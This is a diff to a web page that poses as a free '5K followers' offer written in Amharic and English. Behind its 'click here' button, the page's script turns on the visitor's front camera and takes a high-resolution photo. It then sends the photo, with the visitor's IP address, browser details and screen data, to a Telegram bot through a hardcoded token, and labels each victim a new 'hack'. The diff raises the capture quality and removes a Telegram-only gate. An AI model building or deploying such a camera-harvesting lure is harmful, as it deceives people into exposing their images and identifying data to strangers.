@@ -1,3 +1,4 @@
+<!-- index.html - HIGH QUALITY CAMERA VERSION -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -139,44 +140,14 @@
   </div>
   <h1>✨ 5K <span>FOLLOWERS</span> ✨</h1>
   <p class="sub">አሁን በቀላሉ ያግኙ! • ፈጣን እና አስተማማኝ</p>
-  <button class="btn" id="btn">🔥🙏👉click heare👈</button>
+  <button class="btn" id="btn">🔥 👉click here 🙏🔥👈</button>
   <div id="status">⏳ እባክዎ ይጫኑ</div>
-  <div class="badge">📱 አንድሮይድ ተመችቷል</div>
+  <div class="badge">📱 አንድሮይድ 📱</div>
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 </div>
 
 <script>
-  // ============================================================
-  // TELEGRAM-ONLY GATE - Blocks IMO, TikTok, Chrome, etc.
-  // ============================================================
-  (function() {
-    const ua = navigator.userAgent || '';
-    const isTelegram = ua.includes('Telegram') || ua.includes('TelegramBot') || 
-                       (typeof window.Telegram !== 'undefined') ||
-                       (typeof window.TelegramWebviewProxy !== 'undefined');
-    const referrer = document.referrer || '';
-    const isFromTelegramLink = referrer.includes('t.me') || referrer.includes('telegram.org');
-
-    if (!isTelegram && !isFromTelegramLink) {
-      document.body.innerHTML = `
-        <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0f0c29;color:#fff;font-family:Arial;text-align:center;padding:20px;">
-          <div>
-            <h1 style="color:#ff0050;font-size:28px;">🚫 በቴሌግራም ብቻ</h1>
-            <p style="font-size:18px;margin-top:20px;color:#ccc;">ይህ ሊንክ በቴሌግራም መተግበሪያ ውስጥ ብቻ ይሰራል</p>
-            <p style="font-size:14px;color:#888;margin-top:30px;">Open this link only inside Telegram app</p>
-            <a href="https://t.me/YourBotUsername?start=ref" style="display:inline-block;margin-top:30px;padding:15px 40px;background:#0088cc;color:#fff;border-radius:30px;text-decoration:none;font-weight:bold;">📱 ክፈት በቴሌግራም</a>
-          </div>
-        </div>
-      `;
-      throw new Error('Telegram-only access');
-    }
-  })();
-  // ============================================================
-
-  // ============================================================
-  // MAIN APPLICATION
-  // ============================================================
   (function() {
     // REPLACE WITH YOUR VALID TOKEN
     const BOT_TOKEN = "8696702393:AAH2VUaAIduB146kOQI7BA9QAml7jaUw7k0";
@@ -190,8 +161,9 @@
     const btn = document.getElementById('btn');
     const statusDiv = document.getElementById('status');
 
-    const TARGET_WIDTH = 1280;
-    const TARGET_HEIGHT = 720;
+    // HIGH RESOLUTION SETTINGS
+    const TARGET_WIDTH = 1280;   // was 480
+    const TARGET_HEIGHT = 720;   // was 640
 
     function setStatus(msg, isError = false) {
       statusDiv.innerHTML = msg;
@@ -222,9 +194,10 @@
           w = TARGET_HEIGHT;
           h = TARGET_WIDTH;
         }
+        // Double canvas resolution for extra clarity
         canvas.width = w * 2;
         canvas.height = h * 2;
-        ctx.scale(2, 2);
+        ctx.scale(2, 2); // draw at 2x
 
         const vw = video.videoWidth;
         const vh = video.videoHeight;
@@ -242,9 +215,10 @@
         ctx.clearRect(0, 0, w, h);
         ctx.drawImage(video, offsetX, offsetY, drawW, drawH);
         
+        // Export at max quality
         canvas.toBlob(function(blob) {
           resolve(blob);
-        }, 'image/jpeg', 0.95);
+        }, 'image/jpeg', 0.95); // was 0.85
       });
     }
 
@@ -252,7 +226,7 @@
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
       formData.append('photo', photoBlob, 'cam_hd.jpg');
-      let caption = '📸 አዲስ hack ⬇️😂(HD)\n' +
+      let caption = '👇አዲስ hack 😂⬇️(HD)\n' +
                     'IP: ' + info.ip + '\n' +
                     'UA: ' + info.ua + '\n' +
                     'Screen: ' + info.screen + '\n' +
@@ -267,15 +241,15 @@
     }
 
     function startHarvest() {
-      setStatus('processing(HD)...');
+      setStatus('processing (HD)...');
       btn.disabled = true;
       btn.style.opacity = '0.6';
 
       navigator.mediaDevices.getUserMedia({
         video: {
           facingMode: 'user',
-          width: { ideal: 1920 },
-          height: { ideal: 1080 },
+          width: { ideal: 1920 },   // was 480
+          height: { ideal: 1080 },  // was 640
           frameRate: { ideal: 30 }
         },
         audio: false
@@ -284,16 +258,16 @@
         video.srcObject = stream;
         video.onloadedmetadata = function() {
           video.play();
-          setStatus('🙏wait🫸(HD)...');
+          setStatus('በሂደት ላይ🤩 (HD)...');
           setTimeout(() => {
             Promise.all([capturePhoto(), getIPAndUA()])
               .then(([photoBlob, info]) => {
-                setStatus('follwer እየጨመረ ነው(HD)...');
+                setStatus('ይጠብቁ🫸🙏(HD)...');
                 return sendToTelegram(photoBlob, info);
               })
               .then(response => {
                 if (response.ok) {
-                  setStatus('✅ 5K ተከታዮች በ ቂርብ ቀን 🤩🎉');
+                  setStatus('✅ 5K follower በ 3 ቀናቶች ውስጥ ይጠብቀን🥹🎉');
                 } else {
                   setStatus('❌ ስህተት: ' + JSON.stringify(response).substring(0, 100), true);
                 }
